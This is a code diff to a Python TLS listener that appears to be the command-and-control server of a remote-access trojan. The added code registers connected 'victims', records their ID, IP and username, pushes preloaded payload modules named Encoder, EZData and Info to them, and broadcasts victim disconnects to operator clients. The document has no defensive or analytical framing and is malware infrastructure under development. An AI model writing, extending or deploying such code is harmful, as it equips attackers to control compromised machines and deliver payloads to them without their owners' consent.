@@ -56,7 +56,7 @@ class Listener:
             conn, addr = self.sock.accept()
 
             try:
-                conn = self.context.wrap_bio(conn, server_side=True)
+                conn = self.context.wrap_socket(conn, server_side=True)
             except ssl.SSLError as ex:
                 self.log.error(str(ex))
                 continue
@@ -83,14 +83,12 @@ class Listener:
 
         clnt = Client(clnt_sock)
         clnt.addr = clnt_addr
+        clnt.type = 'TLS'
 
         try:
             while clnt_sock.fileno() != -1:
                 abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecv = len(abStaticRecv)
-
-                print(nRecv)
-                print(abStaticRecv)
 
                 abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecv)
 
@@ -113,10 +111,68 @@ class Listener:
 
                         abMsg = c2p.get_msg()
 
-                        print(abMsg)
+                        if nCmd == 0:
+                            if nParam == 0:
+                                pass
+                            elif nParam == 1:
+                                pass
+
+                        elif nCmd == 1:
+                            if nParam == 0: # received hello handshake.
+                                clnt.sendcommand(1, 1) # send acknowledgement.
+                            elif nParam == 2:
+                                clnt.sendcommand(2, 0) # received acknowledgement.
+
+                        elif nCmd == 2:
+                            szMsg = abMsg.decode('utf-8')
+                            lsMsg = szMsg.split('|')
+
+                            if nParam == 1:
+                                self.dic_victim[clnt_addr] = EZClass.Victim(lsMsg[0], None, clnt)
+
+                                # pre load payload
+                                ls_preload = [
+                                    'Encoder',
+                                    'EZData',
+                                ]
+                                for szName in ls_preload:
+                                    szPayload = get_payload(self.dic_victim[clnt_addr].szTag, szName)
+                                    clnt.sendvictim(['*', szName, szPayload])
+
+                                ls_send = [
+                                    '*',
+                                    'Info',
+                                    get_payload(self.dic_victim[clnt_addr].szTag, 'Info'),
+                                    'start',
+                                ]
+
+                                clnt.sendvictim(ls_send)
+                            elif nParam == 3:
+                                lsMsg = [Encoder.b64d2str(x) for x in lsMsg]
+                                if lsMsg[1] == 'info' and lsMsg[2] == 'start':
+                                    if clnt_addr in self.dic_victim.keys():
+                                        obj_json = json.loads(lsMsg[3])
+
+                                        obj_class = self.dic_victim[clnt_addr]
+                                        
+                                        if obj_json['ID'] in self.dic_victim.keys():
+                                            clnt.close()
+                                            break
+                                        else:
+                                            self.dic_victim[obj_json['ID']] = EZClass.Victim(obj_class.szTag, obj_json['ID'], clnt, obj_json['IP'], obj_json['Username'])
+                                            self.dic_victim.pop(clnt_addr)
+                                            clnt.VictimID = obj_json['ID']
+
+                                self.msg_handler(self.main_listener, self, lsMsg[0], clnt, lsMsg[1:])
         
         except Exception as ex:
             self.log.error(str(ex))
+
+        # disconnect
+        self.log.debug(f'Victim offline: {clnt.VictimID}')
+        if clnt.VictimID in self.dic_victim.keys():
+            self.dic_victim.pop(clnt.VictimID)
+            self.main_listener.boardcast_clnt(['disconnect', 'victim', clnt.VictimID])
 
     def get_victims(self) -> dict:
         return self.dic_victim
